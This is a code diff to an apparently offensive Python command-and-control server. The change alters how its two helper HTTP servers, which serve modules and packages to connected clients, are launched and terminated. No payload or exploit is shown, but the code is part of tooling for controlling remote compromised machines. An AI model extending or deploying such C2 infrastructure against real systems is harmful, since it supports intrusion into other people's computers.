@@ -8,6 +8,7 @@ import sys
 import time
 import json
 import Queue
+import signal
 import pickle
 import socket
 import struct
@@ -20,6 +21,7 @@ import threading
 import subprocess
 import collections
 import multiprocessing
+
 
 # modules
 import core.util as util
@@ -99,8 +101,9 @@ def main():
     packages = packages[0]
     options = parser.parse_args()
 
-    globals()['package_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=packages, shell=True)
-    globals()['module_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 1), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=modules, shell=True)
+
+    globals()['package_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=packages, shell=True, preexec_fn=os.setsid)
+    globals()['module_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 1), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=modules, shell=True, preexec_fn=os.setsid)
     globals()['c2'] = C2(host=options.host, port=options.port, db=options.database)
 
     c2.run()
@@ -307,8 +310,10 @@ class C2():
         Quit server and optionally keep clients alive
         
         """
-        globals()['package_handler'].terminate()
-        globals()['module_handler'].terminate()
+        os.killpg(os.getpgid(globals()['package_handler'].pid), signal.SIGTERM)
+        os.killpg(os.getpgid(globals()['module_handler'].pid), signal.SIGTERM)
+        #globals()['package_handler'].kill()
+        #globals()['module_handler'].kill()
         if self._get_prompt('Quiting server - keep clients alive? (y/n): ').startswith('y'):
             for session in self.sessions.values():
                 session._active.set()
